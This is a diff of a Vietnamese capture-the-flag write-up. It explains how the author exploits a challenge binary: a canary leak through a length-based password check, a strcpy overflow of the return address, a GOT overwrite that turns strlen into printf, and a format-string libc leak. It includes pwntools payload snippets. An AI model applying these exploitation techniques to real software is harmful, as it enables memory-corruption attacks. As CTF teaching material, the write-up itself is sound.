@@ -163,7 +163,7 @@ Phân tích thì bài này có 2 chức năng chính, login và copy, 1 số k�
 * Hàm check_password so sánh theo độ dài của input chứ không phải so sánh 16 bytes, dễ đến bị leak 1 số thống tin trên stack. 
 * Hàm copy dùng `strcpy`, overflow là cái chắc. Để ý thì con trỏ input của hàm `login` là `[rbp-0x80]` và của hàm `copy` là `[rbp-0x80]`, nhưng hàm độ dài lớn nhất của input của hàm `copy` là 0x3f, còn `login` là 0x80. Tức là ta ghi đoạn payload cần overflow bằng hàm `login` xong đó dùng hàm `copy`. Hàm `copy` copy vào địa chỉ `[rbp-0x70]`, tức là ta ghi đè được old rbp và return address.
 * Khi đăng nhập thì nó còn có 1 đoạn thông báo: `puts("Your password is too small!");` và `puts("Your password is too large!");`. Nghĩ ngay đến bruteforce trên stack, nhưng do giới hạn số lần đăng nhập sai nên viết thuật toán cẩn thận tý là ăn.
-* 
+
 Đây là đoạn leak 16 byte 
 ```python
 leak_canary = b''
@@ -215,13 +215,13 @@ r.sendafter(b'> ', b'1\n')
 Ok bây giờ thoát vòng lặp và chương trình sẽ return về địa chỉ Base + 0x14ad
 ![image](https://user-images.githubusercontent.com/54637811/176096882-604c214e-0ff9-43d0-9ccf-ca1d0e364ed1.png)
 
-rbp đang bằng `bin.got['strcpy']+0x80`, do đó ta có thể ghi 0x39 bytes trên GOT
+rbp đang bằng `bin.got['strcpy']+0x80`, do đó ta có thể ghi trên GOT
 ```python
 payload = p64(bin.symbols['login']) + p64(bin.symbols['login']) + p64(bin.plt['write']+6) + \
         p64(bin.plt['printf']+6)
 r.sendafter(b'Copy :', payload)
 ```
-`strcpy`, `puts` sẽ thay bằng hàm `login`, `strlen` sẽ thay bằng printf để có **Format string**.
+`strcpy`, `puts` sẽ thay bằng hàm `login`, `strlen` sẽ thay bằng `printf` để có **Format string**.
 Luồng thực thi sẽ chạy tiếp đến hàm `strcpy` (đã bị ghi đè thành `login`). Trong hàm `login` sẽ nhận input và đưa vào `strlen`, ta sẽ leak được Libc
 ```python
 payload = b'%4$p'.ljust(8, b'\x00') + p64(bin.symbols['copy'])
